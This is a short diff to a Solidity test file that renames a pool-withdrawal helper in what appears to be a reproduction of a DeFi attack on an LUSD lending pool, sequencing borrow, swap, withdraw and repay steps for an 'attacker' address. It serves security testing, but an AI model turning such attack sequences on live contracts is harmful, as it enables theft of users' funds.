@@ -294,7 +294,7 @@ contract LUSDTestBase is Test, BlockLoader {
         loan.supply(address(btcb), amount);
     }
 
-    function burn_lusd_lusdpool(uint256 amount) internal eurus {
+    function withdraw_lusdpool_lusd_usdt(uint256 amount) internal eurus {
         lusd.approve(address(lusdpool), type(uint256).max);
         lusdpool.withdraw(amount);
     }
@@ -310,7 +310,7 @@ contract LUSDTestBase is Test, BlockLoader {
         printBalance("After step1 ");
         swap_loan_attacker_btcb_lusd(1515366635982742, 10000 * 1e18);
         printBalance("After step2 ");
-        burn_lusd_lusdpool(lusd.balanceOf(attacker));
+        withdraw_lusdpool_lusd_usdt(lusd.balanceOf(attacker));
         printBalance("After step3 ");
         swap_pairub_attacker_btcb_usdt(
             btcb.balanceOf(attacker),
@@ -339,7 +339,7 @@ contract LUSDTestBase is Test, BlockLoader {
         borrow_usdt_owner(amt0);
         swap_pairub_attacker_usdt_btcb(amt1, amt2);
         swap_loan_attacker_btcb_lusd(amt3, amt4);
-        burn_lusd_lusdpool(amt5);
+        withdraw_lusdpool_lusd_usdt(amt5);
         swap_pairub_attacker_btcb_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
         assert(!attackGoal());
